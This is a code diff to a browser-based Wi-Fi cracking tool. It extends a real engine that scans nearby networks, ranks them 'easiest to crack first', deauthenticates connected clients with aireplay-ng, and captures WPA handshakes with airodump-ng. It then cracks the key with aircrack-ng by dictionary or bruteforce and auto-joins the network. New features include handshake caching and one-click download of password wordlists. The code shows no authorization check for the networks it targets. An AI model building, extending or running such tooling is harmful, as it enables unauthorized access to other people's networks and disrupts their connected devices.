@@ -463,17 +463,21 @@ class Job:
         self.status = "running"          # running | success | failed | stopped
         self.result = None               # {"key":..., "user":..., "method":...}
         self.log = []                    # list of event dicts
+        self.progress = None             # {"phase":..., "pct":0-100} for the UI bar
         self.created = time.time()
         self._stop = threading.Event()
         self._lock = threading.Lock()
 
-    def emit(self, phase, msg, level="info"):
+    def emit(self, phase, msg, level="info", pct=None):
         with self._lock:
+            if pct is not None:
+                self.progress = {"phase": phase, "pct": max(0, min(100, int(pct)))}
             self.log.append({
                 "t": round(time.time() - self.created, 2),
                 "phase": phase,
                 "level": level,
                 "msg": msg,
+                "pct": (self.progress["pct"] if pct is not None else None),
             })
 
     def snapshot(self, since=0):
@@ -486,6 +490,7 @@ class Job:
             "network": self.network,
             "events": events,
             "total_events": len(self.log),
+            "progress": self.progress,
         }
 
     def stopped(self):
@@ -500,6 +505,7 @@ class BaseEngine:
         self.wordlist = wordlist
         self.jobs = {}
         self._networks = []
+        self.handshakes = set()   # bssids whose handshake was captured this session
 
     def start_attack(self, bssid, options):
         net = next((n for n in self._networks if n["bssid"] == bssid), None)
@@ -566,6 +572,7 @@ class DemoEngine(BaseEngine):
             n = {
                 "ssid": ssid, "bssid": bssid, "enc": enc, "channel": ch,
                 "signal": sig, "clients": clients, "wps": wps,
+                "has_handshake": bssid in self.handshakes,
                 "_secret": secret, "_user": user,
             }
             n["difficulty"] = estimate(n)
@@ -615,10 +622,10 @@ class DemoEngine(BaseEngine):
 
         # --- WEP path ---------------------------------------------------------
         if enc == "WEP":
-            job.emit("capture", f"Locking to channel {ch}, capturing IVs (airodump-ng).")
+            job.emit("capture", f"Locking to channel {ch}, capturing IVs (airodump-ng).", pct=0)
             for pct in (12, 34, 58, 81, 100):
                 if not self._sleep(job, 0.7): return self._finish(job, "stopped")
-                job.emit("capture", f"Collected IVs... {pct}%")
+                job.emit("capture", f"Collected IVs... {pct}%", pct=pct)
             job.emit("crack", "Running aircrack-ng PTW attack on captured IVs.")
             if not self._sleep(job, 1.2): return self._finish(job, "stopped")
             return self._succeed(job, net, method="wep-iv")
@@ -643,17 +650,22 @@ class DemoEngine(BaseEngine):
             job.emit("done", "No practical offline attack against WPA3-SAE.", "error")
             return self._finish(job, "failed")
 
-        job.emit("capture", f"Listening for WPA handshake on channel {ch} (airodump-ng -c {ch}).")
-        if not self._sleep(job, 1): return self._finish(job, "stopped")
-        if net.get("clients", 0) > 0:
-            job.emit("deauth", f"{net['clients']} client(s) present. Sending deauth "
-                               f"(aireplay-ng --deauth 5) to force a reconnect.")
+        if bssid in self.handshakes:
+            job.emit("capture", "Reusing the 4-way handshake captured earlier this "
+                                "session — no need to capture it again.", "success")
         else:
-            job.emit("deauth", "No clients connected — waiting for one to join...", "warn")
+            job.emit("capture", f"Listening for WPA handshake on channel {ch} (airodump-ng -c {ch}).")
+            if not self._sleep(job, 1): return self._finish(job, "stopped")
+            if net.get("clients", 0) > 0:
+                job.emit("deauth", f"{net['clients']} client(s) present. Sending deauth "
+                                   f"(aireplay-ng --deauth 5) to force a reconnect.")
+            else:
+                job.emit("deauth", "No clients connected — waiting for one to join...", "warn")
+                if not self._sleep(job, 1.5): return self._finish(job, "stopped")
+                job.emit("deauth", "A client joined. Sending deauth to capture the handshake.")
             if not self._sleep(job, 1.5): return self._finish(job, "stopped")
-            job.emit("deauth", "A client joined. Sending deauth to capture the handshake.")
-        if not self._sleep(job, 1.5): return self._finish(job, "stopped")
-        job.emit("capture", "WPA handshake captured!  (EAPOL 4/4)", "success")
+            job.emit("capture", "WPA handshake captured!  (EAPOL 4/4)", "success")
+            self.handshakes.add(bssid)
 
         # --- Crack the handshake ---------------------------------------------
         method = opts.get("method") or "handshake+dictionary"
@@ -661,18 +673,21 @@ class DemoEngine(BaseEngine):
             charset = opts.get("charset", "digits")
             length = opts.get("length", 8)
             job.emit("crack", f"Bruteforce mode: {charset}, length {length} "
-                              f"(aircrack-ng via crunch pipe). This can take a very long time.")
-            for pct in (3, 9, 21, 40, 66, 92):
+                              f"(aircrack-ng via crunch pipe). This can take a very long time.", pct=0)
+            for pct in (3, 9, 21, 40, 66, 92, 100):
                 if not self._sleep(job, 0.8): return self._finish(job, "stopped")
-                job.emit("crack", f"Keyspace searched... {pct}%")
+                job.emit("crack", f"Keyspace searched... {pct}%", pct=pct)
             return self._succeed(job, net, method="handshake+bruteforce")
         else:
             wl = opts.get("wordlist") or self.wordlist or "rockyou.txt"
-            job.emit("crack", f"Dictionary attack against handshake (aircrack-ng -w {os.path.basename(wl)}).")
-            for i, pct in enumerate((5, 18, 37, 59, 78, 95)):
+            wl = self._resolve_wordlist(job, wl)
+            if wl is None:
+                return self._finish(job, "stopped" if job.stopped() else "failed")
+            job.emit("crack", f"Dictionary attack against handshake (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
+            for i, pct in enumerate((5, 18, 37, 59, 78, 95, 100)):
                 if not self._sleep(job, 0.7): return self._finish(job, "stopped")
                 tested = pct * 1423
-                job.emit("crack", f"Tested {tested:,} keys... {pct}%")
+                job.emit("crack", f"Tested {tested:,} keys... {pct}%", pct=pct)
             return self._succeed(job, net, method="handshake+dictionary")
 
     def _connect_sim(self, job, net, key):
@@ -689,6 +704,20 @@ class DemoEngine(BaseEngine):
         self._sleep(job, 1.0)
         job.emit("connect", f"Connected to {ssid}. You are on the network.", "success")
         return True, shown
+
+    def _resolve_wordlist(self, job, wl):
+        """In demo mode 'downloading' a wordlist from the internet is simulated
+        with a progress bar so the workflow matches real mode exactly."""
+        if isinstance(wl, str) and wl.lower().startswith(("http://", "https://")):
+            name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
+            job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
+            for pct in (8, 26, 50, 74, 92, 100):
+                if not self._sleep(job, 0.5):
+                    return None
+                job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
+            job.emit("download", f"Saved {name} — using it for the dictionary attack.", "success", pct=100)
+            return name
+        return wl
 
     def _succeed(self, job, net, method):
         secret = net.get("_secret") or "(demo-key-not-set)"
@@ -779,6 +808,7 @@ class RealEngine(BaseEngine):
         for n in nets:
             if n["bssid"].upper() in wps:
                 n["wps"] = True
+            n["has_handshake"] = n["bssid"] in self.handshakes
             n["difficulty"] = estimate(n)
 
         self._networks = nets
@@ -851,6 +881,46 @@ class RealEngine(BaseEngine):
         else:
             job.emit("connect", f"Auto-connect failed. Run manually: {shown}", "warn")
         return ok, shown
+
+    def _resolve_wordlist(self, job, wl):
+        """If wl is an http(s) URL, download it into the workdir (with a progress
+        bar) and return the local path. Local paths pass through unchanged.
+        Downloads are cached by filename so re-runs this session never re-fetch."""
+        if not (isinstance(wl, str) and wl.lower().startswith(("http://", "https://"))):
+            return wl
+        import urllib.request
+        name = wl.rstrip("/").split("/")[-1] or "wordlist.txt"
+        dest = os.path.join(self.workdir, name)
+        if os.path.exists(dest) and os.path.getsize(dest) > 0:
+            job.emit("download", f"Using cached wordlist {name} (downloaded earlier this session).",
+                     "success", pct=100)
+            return dest
+        job.emit("download", f"Fetching wordlist from the internet: {wl}", pct=0)
+        try:
+            req = urllib.request.Request(wl, headers={"User-Agent": "crack-wifi/1.0"})
+            with urllib.request.urlopen(req, timeout=30) as resp, open(dest, "wb") as out:
+                total = int(resp.headers.get("Content-Length") or 0)
+                read = 0
+                last = -1
+                while True:
+                    if job.stopped():
+                        return None
+                    chunk = resp.read(65536)
+                    if not chunk:
+                        break
+                    out.write(chunk)
+                    read += len(chunk)
+                    if total:
+                        pct = int(read * 100 / total)
+                        if pct != last and pct % 5 == 0:
+                            last = pct
+                            job.emit("download", f"Downloading {name}... {pct}%", pct=pct)
+        except Exception as e:
+            job.emit("download", f"Wordlist download failed: {e}", "error")
+            return None
+        job.emit("download", f"Saved {name} ({read:,} bytes) — using it for the dictionary attack.",
+                 "success", pct=100)
+        return dest
 
     def _succeed(self, job, net, key, method, note, opts, user=None):
         """Record a recovered key and optionally join the network."""
@@ -940,38 +1010,45 @@ class RealEngine(BaseEngine):
             job.emit("crack", "WPA3-SAE — no practical offline attack.", "error")
             return self._finish(job, "failed")
 
-        # --- WPA/WPA2: capture the 4-way handshake --------------------------
+        # --- WPA/WPA2: capture the 4-way handshake (or reuse a cached one) ---
         cap_prefix = os.path.join(self.workdir, "hs_" + bssid.replace(":", ""))
-        for f in _glob(cap_prefix, "cap"):
-            try: os.remove(f)
-            except OSError: pass
-        job.emit("capture", f"Capturing handshake on channel {ch} (airodump-ng).")
-        dump = subprocess.Popen(
-            ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", cap_prefix,
-             "--output-format", "cap", mon],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        try:
-            deadline = time.time() + opts.get("capture_timeout", 90)
-            got = False
-            while time.time() < deadline and not job.stopped():
-                job.emit("deauth", f"Sending deauth to {bssid} (aireplay-ng --deauth 5).")
-                self._run(["aireplay-ng", "--deauth", "5", "-a", bssid, mon], timeout=15)
-                time.sleep(4)
-                caps = _glob(cap_prefix, "cap")
-                if caps and _has_handshake(caps[0], bssid):
-                    got = True
-                    break
-        finally:
-            dump.terminate()
-            try: dump.wait(timeout=3)
-            except subprocess.TimeoutExpired: dump.kill()
+        cached = _glob(cap_prefix, "cap")
+        if bssid in self.handshakes and cached and _has_handshake(cached[0], bssid):
+            job.emit("capture", "Reusing the handshake captured earlier this session "
+                                "— skipping capture.", "success")
+            caps = cached
+        else:
+            for f in cached:
+                try: os.remove(f)
+                except OSError: pass
+            job.emit("capture", f"Capturing handshake on channel {ch} (airodump-ng).")
+            dump = subprocess.Popen(
+                ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", cap_prefix,
+                 "--output-format", "cap", mon],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            try:
+                deadline = time.time() + opts.get("capture_timeout", 90)
+                got = False
+                while time.time() < deadline and not job.stopped():
+                    job.emit("deauth", f"Sending deauth to {bssid} (aireplay-ng --deauth 5).")
+                    self._run(["aireplay-ng", "--deauth", "5", "-a", bssid, mon], timeout=15)
+                    time.sleep(4)
+                    caps = _glob(cap_prefix, "cap")
+                    if caps and _has_handshake(caps[0], bssid):
+                        got = True
+                        break
+            finally:
+                dump.terminate()
+                try: dump.wait(timeout=3)
+                except subprocess.TimeoutExpired: dump.kill()
 
-        if job.stopped(): return self._finish(job, "stopped")
-        caps = _glob(cap_prefix, "cap")
-        if not caps or not got:
-            job.emit("capture", "Could not capture a handshake in time.", "error")
-            return self._finish(job, "failed")
-        job.emit("capture", "Handshake captured.", "success")
+            if job.stopped(): return self._finish(job, "stopped")
+            caps = _glob(cap_prefix, "cap")
+            if not caps or not got:
+                job.emit("capture", "Could not capture a handshake in time.", "error")
+                return self._finish(job, "failed")
+            self.handshakes.add(bssid)   # remember it for the rest of the session
+            job.emit("capture", "Handshake captured.", "success")
 
         # --- Crack the handshake --------------------------------------------
         wl = opts.get("wordlist") or self.wordlist
@@ -993,10 +1070,13 @@ class RealEngine(BaseEngine):
             key = _parse_aircrack_key(r.stdout)
             method = "handshake+bruteforce"
         else:
+            wl = self._resolve_wordlist(job, wl)
+            if wl is None:
+                return self._finish(job, "stopped" if job.stopped() else "failed")
             if not wl or not os.path.exists(wl):
                 job.emit("crack", f"Wordlist not found: {wl}", "error")
                 return self._finish(job, "failed")
-            job.emit("crack", f"Dictionary attack (aircrack-ng -w {os.path.basename(wl)}).")
+            job.emit("crack", f"Dictionary attack (aircrack-ng -w {os.path.basename(wl)}).", pct=0)
             r = self._run(["aircrack-ng", "-b", bssid, "-w", wl, caps[0]],
                           timeout=opts.get("crack_timeout", 3600))
             key = _parse_aircrack_key(r.stdout)
@@ -1296,7 +1376,6 @@ CRACK_EOF_SERVER
     </div>
     <div class="topbar-right">
       <span id="mode-badge" class="badge badge-demo">demo</span>
-      <button id="scan-btn" class="btn btn-primary">Scan networks</button>
     </div>
   </header>
 
@@ -1309,11 +1388,14 @@ CRACK_EOF_SERVER
     <section class="panel networks-panel">
       <div class="panel-head">
         <h2>Networks</h2>
-        <span id="net-count" class="muted"></span>
+        <div class="panel-head-right">
+          <span id="net-count" class="muted"></span>
+          <button id="rescan-btn" class="icon-btn" title="Rescan" aria-label="Rescan">&#8635;</button>
+        </div>
       </div>
       <div id="scan-hint" class="empty-state">
-        <p>No scan yet.</p>
-        <p class="muted">Click <strong>Scan networks</strong> to look for nearby Wi-Fi.</p>
+        <p id="scan-hint-title">Scanning for nearby Wi-Fi&hellip;</p>
+        <p class="muted">Networks appear here automatically, easiest to crack first.</p>
       </div>
       <ul id="network-list" class="network-list"></ul>
     </section>
@@ -1374,6 +1456,12 @@ CRACK_EOF_SERVER
               <input id="opt-wordlist" type="text" placeholder="/usr/share/wordlists/rockyou.txt" />
             </label>
             <label>
+              Online wordlist
+              <select id="opt-online-wordlist">
+                <option value="">&mdash; use local path &mdash;</option>
+              </select>
+            </label>
+            <label>
               Bruteforce charset
               <select id="opt-charset">
                 <option value="digits">Digits (0-9)</option>
@@ -1396,6 +1484,17 @@ CRACK_EOF_SERVER
           <button id="attack-btn" class="btn btn-danger">Start audit</button>
           <button id="stop-btn" class="btn btn-ghost hidden">Stop</button>
           <span id="status-pill" class="pill hidden"></span>
+        </div>
+
+        <!-- Progress bar -->
+        <div id="progress-wrap" class="progress-wrap hidden">
+          <div class="progress-top">
+            <span id="progress-label" class="progress-label">Working</span>
+            <span id="progress-pct" class="progress-pct"></span>
+          </div>
+          <div class="progress-track">
+            <div id="progress-fill" class="progress-fill"></div>
+          </div>
         </div>
 
         <!-- Result -->
@@ -1494,6 +1593,19 @@ body {
 .title { font-weight: 600; font-size: 16px; letter-spacing: .2px; }
 .topbar-right { display: flex; align-items: center; gap: 12px; }
 
+.panel-head-right { display: flex; align-items: center; gap: 10px; }
+.icon-btn {
+  background: transparent; color: var(--muted);
+  border: 1px solid var(--border); border-radius: 6px;
+  width: 28px; height: 28px; padding: 0; line-height: 1;
+  font-size: 15px; cursor: pointer;
+  display: inline-flex; align-items: center; justify-content: center;
+  transition: color .12s, border-color .12s, transform .25s;
+}
+.icon-btn:hover { color: var(--text); border-color: var(--muted); }
+.icon-btn.spinning { animation: spin .8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
 .badge {
   font-family: var(--mono);
   font-size: 11px;
@@ -1537,14 +1649,23 @@ body {
 /* Layout */
 .layout {
   display: grid;
-  grid-template-columns: 380px 1fr;
-  gap: 18px;
-  padding: 18px 22px;
-  max-width: 1200px;
+  grid-template-columns: 340px 1fr;
+  gap: 24px;
+  padding: 26px 28px 48px;
+  max-width: 1180px;
   margin: 0 auto;
+  align-items: start;
 }
 @media (max-width: 820px) {
-  .layout { grid-template-columns: 1fr; }
+  .layout { grid-template-columns: 1fr; padding: 18px 16px 32px; gap: 18px; }
+}
+@media (min-width: 821px) {
+  .networks-panel {
+    position: sticky; top: 24px;
+    max-height: calc(100vh - 48px);
+    display: flex; flex-direction: column;
+  }
+  .networks-panel .network-list { overflow-y: auto; }
 }
 
 .panel {
@@ -1578,7 +1699,7 @@ body {
 .ni-signal { width: 26px; text-align: center; font-family: var(--mono); font-size: 11px; color: var(--muted); }
 .ni-main { flex: 1; min-width: 0; }
 .ni-ssid { font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.ni-sub { font-size: 11px; color: var(--muted); font-family: var(--mono); }
+.ni-sub { font-size: 11px; color: var(--muted); font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 .ni-diff {
   font-size: 11px; font-weight: 600;
   padding: 2px 7px; border-radius: 999px;
@@ -1591,6 +1712,21 @@ body {
 .diff-Very.hard, .diff-Veryhard { background:#2a1414; color:var(--danger); }
 
 .lock { font-size: 12px; }
+.ni-hs {
+  font-size: 10px; font-weight: 700; letter-spacing: .3px;
+  padding: 2px 6px; border-radius: 999px;
+  background: #0c2417; color: var(--ok); border: 1px solid #17422a;
+  white-space: nowrap;
+}
+
+/* Loading skeleton shown while auto-scanning */
+.skeleton-item {
+  height: 46px; margin: 6px; border-radius: 8px;
+  background: linear-gradient(90deg, var(--bg-3) 25%, #222c39 37%, var(--bg-3) 63%);
+  background-size: 400% 100%;
+  animation: shimmer 1.2s ease-in-out infinite;
+}
+@keyframes shimmer { 0% { background-position: 100% 0; } 100% { background-position: 0 0; } }
 
 /* Detail panel */
 .detail { padding: 18px; }
@@ -1660,6 +1796,33 @@ body {
 .pill-success { color: var(--ok); border-color: #17422a; }
 .pill-failed  { color: var(--danger); border-color: #4a1717; }
 .pill-stopped { color: var(--warn); border-color: #4a3d16; }
+
+/* Progress bar (native-feeling) */
+.progress-wrap { margin-top: 16px; }
+.progress-top {
+  display: flex; justify-content: space-between; align-items: baseline;
+  margin-bottom: 6px;
+}
+.progress-label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px; }
+.progress-pct { font-family: var(--mono); font-size: 12px; color: var(--accent); font-weight: 700; }
+.progress-track {
+  height: 10px; border-radius: 999px;
+  background: var(--bg-3); border: 1px solid var(--border);
+  overflow: hidden;
+}
+.progress-fill {
+  height: 100%; width: 0%;
+  background: linear-gradient(90deg, var(--accent-2), var(--accent));
+  border-radius: 999px;
+  transition: width .35s ease;
+}
+.progress-fill.download { background: linear-gradient(90deg, #7a5cff, #b08bff); }
+.progress-fill.indeterminate {
+  width: 40% !important;
+  background: linear-gradient(90deg, transparent, var(--accent), transparent);
+  animation: indet 1.1s ease-in-out infinite;
+}
+@keyframes indet { 0% { margin-left: -40%; } 100% { margin-left: 100%; } }
 
 /* Result */
 .result {
@@ -1767,12 +1930,15 @@ CRACK_EOF_STYLE
       li.dataset.bssid = n.bssid;
       const diff = n.difficulty || { label: "?", score: 0 };
       const diffClass = "diff-" + (diff.label || "").replace(/\s+/g, "");
+      const hsBadge = n.has_handshake
+        ? `<span class="ni-hs" title="Handshake captured this session">HS ✓</span>` : "";
       li.innerHTML = `
         <span class="ni-signal">${signalBars(n.signal)}</span>
         <span class="ni-main">
           <div class="ni-ssid">${escapeHtml(n.ssid)} <span class="lock">${lockGlyph(n.enc)}</span></div>
           <div class="ni-sub">${escapeHtml(n.enc)} · ch ${n.channel} · ${n.signal != null ? n.signal + " dBm" : "—"}${n.wps ? " · WPS" : ""}</div>
         </span>
+        ${hsBadge}
         <span class="ni-diff ${diffClass}">${escapeHtml(diff.label)}</span>`;
       li.addEventListener("click", () => selectNetwork(n));
       list.appendChild(li);
@@ -1879,15 +2045,47 @@ CRACK_EOF_STYLE
       (snap.events || []).forEach(logLine);
       state.since = snap.total_events;
 
+      updateProgress(snap);
+
       if (snap.status === "running") {
         state.pollTimer = setTimeout(poll, 350);
       } else {
         finishUI(snap.status);
         if (snap.result) showResult(snap.network, snap.result);
+        doScan();   // refresh cached-handshake badges in the list
       }
     }).catch(() => {
       state.pollTimer = setTimeout(poll, 800);
     });
+  }
+
+  const PROGRESS_LABELS = {
+    crack: "Cracking", capture: "Capturing handshake", download: "Downloading wordlist",
+  };
+
+  function updateProgress(snap) {
+    const wrap = $("progress-wrap");
+    const fill = $("progress-fill");
+    const prog = snap.progress;
+    if (snap.status === "running" && prog && prog.phase) {
+      wrap.classList.remove("hidden");
+      $("progress-label").textContent = PROGRESS_LABELS[prog.phase] || "Working";
+      fill.classList.toggle("download", prog.phase === "download");
+      const pct = typeof prog.pct === "number" ? prog.pct : null;
+      if (pct == null) {
+        fill.classList.add("indeterminate");
+        $("progress-pct").textContent = "";
+      } else {
+        fill.classList.remove("indeterminate");
+        fill.style.width = pct + "%";
+        $("progress-pct").textContent = pct + "%";
+      }
+    } else if (snap.status === "success" && prog) {
+      fill.classList.remove("indeterminate");
+      fill.style.width = "100%";
+      $("progress-pct").textContent = "100%";
+      $("progress-label").textContent = "Done";
+    }
   }
 
   async function stopAttack() {
@@ -1958,6 +2156,12 @@ CRACK_EOF_STYLE
     $("status-pill").classList.add("hidden");
     $("stop-btn").classList.add("hidden");
     $("attack-btn").disabled = false;
+    const wrap = $("progress-wrap");
+    wrap.classList.add("hidden");
+    const fill = $("progress-fill");
+    fill.classList.remove("indeterminate", "download");
+    fill.style.width = "0%";
+    $("progress-pct").textContent = "";
   }
 
   function setPill(status) {
@@ -1968,21 +2172,42 @@ CRACK_EOF_STYLE
   }
 
   // -- scan --------------------------------------------------------------
+  let scanning = false;
   async function doScan() {
-    const btn = $("scan-btn");
-    btn.disabled = true;
-    btn.textContent = "Scanning…";
+    if (scanning) return;
+    scanning = true;
+    $("rescan-btn").classList.add("spinning");
+    showScanSkeleton();
     try {
       const res = await api.scan();
       state.networks = res.networks || [];
       // Sort: easiest first (lowest difficulty score).
       state.networks.sort((a, b) => (a.difficulty?.score ?? 100) - (b.difficulty?.score ?? 100));
       renderNetworks(state.networks);
+      // Keep the current selection's cached-handshake state in sync.
+      if (state.selected) {
+        const upd = state.networks.find((n) => n.bssid === state.selected.bssid);
+        if (upd) state.selected = upd;
+        markActive(state.selected.bssid);
+      }
     } catch (e) {
-      alert("Scan failed: " + e);
+      $("scan-hint").classList.remove("hidden");
+      $("scan-hint-title").textContent = "Scan failed — click ↻ to retry.";
     } finally {
-      btn.disabled = false;
-      btn.textContent = "Scan networks";
+      $("rescan-btn").classList.remove("spinning");
+      scanning = false;
+    }
+  }
+
+  function showScanSkeleton() {
+    if (state.networks.length) return; // don't blank an existing list on rescan
+    $("scan-hint").classList.add("hidden");
+    const list = $("network-list");
+    list.innerHTML = "";
+    for (let i = 0; i < 5; i++) {
+      const li = document.createElement("li");
+      li.className = "skeleton-item";
+      list.appendChild(li);
     }
   }
 
@@ -1993,13 +2218,32 @@ CRACK_EOF_STYLE
       .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
   }
 
+  // Curated online wordlists — downloaded on demand by the backend.
+  const ONLINE_WORDLISTS = [
+    { label: "Top 10k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" },
+    { label: "Top 100k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" },
+    { label: "Top 1M passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" },
+    { label: "rockyou.txt (~14M, large)", url: "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" },
+  ];
+
+  function populateWordlists() {
+    const sel = $("opt-online-wordlist");
+    ONLINE_WORDLISTS.forEach((w) => {
+      const o = document.createElement("option");
+      o.value = w.url;
+      o.textContent = w.label;
+      sel.appendChild(o);
+    });
+  }
+
   // -- init --------------------------------------------------------------
   function init() {
-    $("scan-btn").addEventListener("click", doScan);
+    populateWordlists();
+    $("rescan-btn").addEventListener("click", doScan);
     $("attack-btn").addEventListener("click", startAttack);
     $("stop-btn").addEventListener("click", stopAttack);
-    $("opt-method").addEventListener("change", () => {
-      // no-op hook for future UI toggles
+    $("opt-online-wordlist").addEventListener("change", (e) => {
+      if (e.target.value) $("opt-wordlist").value = e.target.value;
     });
 
     api.status().then((s) => {
@@ -2008,6 +2252,9 @@ CRACK_EOF_STYLE
       badge.className = "badge " + (s.mode === "real" ? "badge-real" : "badge-demo");
       if (s.wordlist) $("opt-wordlist").placeholder = s.wordlist;
     }).catch(() => {});
+
+    // Auto-scan on load — no button required.
+    doScan();
   }
 
   document.addEventListener("DOMContentLoaded", init);
